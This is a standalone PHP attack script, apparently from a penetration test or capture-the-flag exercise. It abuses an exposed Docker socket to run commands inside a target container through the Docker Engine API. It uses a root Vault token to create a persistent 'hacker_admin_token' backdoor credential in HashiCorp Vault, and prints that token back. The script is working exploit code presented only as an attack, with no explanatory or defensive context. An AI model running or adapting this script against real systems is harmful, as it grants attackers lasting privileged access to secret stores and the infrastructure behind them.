<?php
echo "[*] Step 1: Issuing Backdoor Admin Token...\n";

$sock = socket_create(AF_UNIX, SOCK_STREAM, 0);
socket_connect($sock, "/var/run/docker.sock");

$target_id = "efb0caf746b4";

$cmd_str = "export VAULT_TOKEN=my_root_token; vault token create -id='hacker_admin_token' -display-name='hacker_account'";

$exec_payload = json_encode([
    "AttachStdout" => true,
    "AttachStderr" => true,
    "Cmd" => ["sh", "-c", $cmd_str]
]);

$req1 = "POST /v1.41/containers/$target_id/exec HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: " . strlen($exec_payload) . "\r\n\r\n" . $exec_payload;
socket_write($sock, $req1);

$res1 = "";
while ($buf = socket_read($sock, 2048)) { $res1 .= $buf; }
socket_close($sock);

preg_match('/"Id":"([^"]+)"/', $res1, $matches);
if(empty($matches[1])) { die("[-] Failed to create exec instance.\n"); }
$exec_id = $matches[1];

$sock2 = socket_create(AF_UNIX, SOCK_STREAM, 0);
socket_connect($sock2, "/var/run/docker.sock");

$start_payload = json_encode(["Detach" => false, "Tty" => false]);
$req2 = "POST /v1.41/exec/$exec_id/start HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: " . strlen($start_payload) . "\r\n\r\n" . $start_payload;
socket_write($sock2, $req2);

echo "\n--- TOKEN ISSUANCE RECEIPT ---\n";
while($out = socket_read($sock2, 2048)) {
    echo preg_replace('/[^\x20-\x7E\n]/', '', $out); 
}
socket_close($sock2);
echo "\n---------------------------------\n";
echo "[*] Backdoor token successfully created.\n";
?>
